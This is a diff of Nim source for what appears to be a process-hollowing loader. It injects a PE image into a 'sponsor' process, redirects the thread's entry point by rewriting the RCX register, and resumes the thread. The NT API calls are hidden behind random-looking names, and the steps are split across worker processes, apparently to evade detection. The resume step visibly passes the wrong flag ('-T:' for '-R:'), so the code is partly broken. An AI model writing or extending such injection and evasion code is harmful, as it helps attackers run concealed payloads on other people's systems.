@@ -96,11 +96,39 @@ proc writeMemoryProcess(
     # success
     quit(0)
 
-proc setThreadProcess(threadHandle: Handle) =
-    discard
 
-proc resumeThreadProcess(threadHandle: Handle) =
-    discard
+proc setThreadProcess(
+    threadHandle: Handle,
+    peImageImageBase: ptr PVOID,
+    peImageEntryPoint: ptr PVOID
+) =
+    var context: CONTEXT
+    context.ContextFlags = CONTEXT_INTEGER
+    if VzpSdkMDEGHOzTpB( # NtGetContextThread
+        threadHandle, 
+        addr context
+    ) != 0:
+        quit(1)
+    var entryPoint = cast[DWORD64](peImageImageBase) + cast[DWORD64](peImageEntryPoint)
+    context.Rcx = cast[DWORD64](entryPoint)
+    if IGyhziwCULdezDSq( # NtSetContextThread
+        threadHandle, 
+        addr context
+    ) != 0:
+        quit(1)
+
+
+proc resumeThreadProcess(
+    threadHandle: Handle
+) =
+    if mAcJDfMgbUNFgsxu( # NtResumeThread
+        threadHandle,
+        NULL
+    ) != 0:
+        quit(1)
+    # success
+    quit(0)
+
 
 proc nimlineSplitted*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
     
@@ -139,7 +167,7 @@ proc nimlineSplitted*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): 
         addr ret
     ) != 0:
         when not defined(release): echo "[-] Could not query sponsor process"   
-        quit()
+        quit(1)
     
     let sponsorPeb = bi.PebBaseAddress
     when not defined(release): echo "[i] Sponsor PEB address: 0x" & $cast[int](sponsorPeb).toHex
@@ -163,9 +191,15 @@ proc nimlineSplitted*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): 
                 sponsorPeb
             )
         elif i.startsWith("-T:"):
-            setThreadProcess(parseInt(i.replace("-T:", "")))
+            setThreadProcess(
+                parseInt(i.replace("-T:", "")),
+                addr peImageImageBase,
+                addr peImageEntryPoint
+            )
         elif i.startsWith("-R:"):
-            resumeThreadProcess(parseInt(i.replace("-R:", "")))
+            resumeThreadProcess(
+                parseInt(i.replace("-R:", ""))
+            )
         else:
             continue
 
@@ -176,7 +210,7 @@ proc nimlineSplitted*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): 
     discard GetExitCodeProcess(ppi.hProcess, addr res)
     if res != 0:
         when not defined(release): echo "[-] Could not allocate memory at sponsor process at address 0x" & $cast[int](peImageImageBase).toHex
-        quit()
+        quit(1)
 
     when not defined(release): echo "[i] New image base address (preferred): 0x" & $cast[int](peImageImageBase).toHex 
     when not defined(release): echo "[i] New entrypoint: 0x" & $(cast[int](peImageImageBase) + cast[int](peImageEntryPoint)).toHex 
@@ -188,32 +222,23 @@ proc nimlineSplitted*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): 
     discard GetExitCodeProcess(ppi.hProcess, addr res)
     if res != 0:
         when not defined(release): echo "[-] Could not write to sponsor process"
-        quit()
+        quit(1)
   
     # Change sponsor thread Entrypoint
-    var context: CONTEXT
-    context.ContextFlags = CONTEXT_INTEGER
-    if VzpSdkMDEGHOzTpB( # NtGetContextThread
-        sponsorThreadHandle, 
-        addr context
-    ) != 0:
-        when not defined(release): echo "[-] Could not read from sponsor process PEB"
-        quit()
-    var entryPoint = cast[DWORD64](peImageImageBase) + cast[DWORD64](peImageEntryPoint)
-    when not defined(release): echo "[i] Changing RCX register to point the new entrypoint: 0x" & $context.Rcx.toHex & " -> 0x" & $entryPoint.toHex
-    context.Rcx = cast[DWORD64](entryPoint)
-    if IGyhziwCULdezDSq( # NtSetContextThread
-        sponsorThreadHandle, addr context
-    ) != 0:
-        when not defined(release): echo "[-] Could not write to from sponsor process PEB"
-        quit()
+    when not defined(release): echo "[*] Changing thread context"
+    ppi = createProcessWorker("-T:" & $sponsorThreadHandle)
+    WaitForSingleObject(ppi.hProcess, 3 * 1000)
+    discard GetExitCodeProcess(ppi.hProcess, addr res)
+    if res != 0:
+        when not defined(release): echo "[-] Could not change thread context"
+        quit(1)
     
     # Resume remote thread 
-    when not defined(release): echo "[*] Resuming remote thread"
-    if mAcJDfMgbUNFgsxu( # NtResumeThread
-        sponsorThreadHandle,
-        NULL
-    ) != 0:
-        when not defined(release): echo "[-] Could resume the thread"
-        quit()
+    when not defined(release): echo "[*] Resuming thread"
+    ppi = createProcessWorker("-T:" & $sponsorThreadHandle)
+    WaitForSingleObject(ppi.hProcess, 3 * 1000)
+    discard GetExitCodeProcess(ppi.hProcess, addr res)
+    if res != 0:
+        when not defined(release): echo "[-] Could not resume thread"
+        quit(1)
 
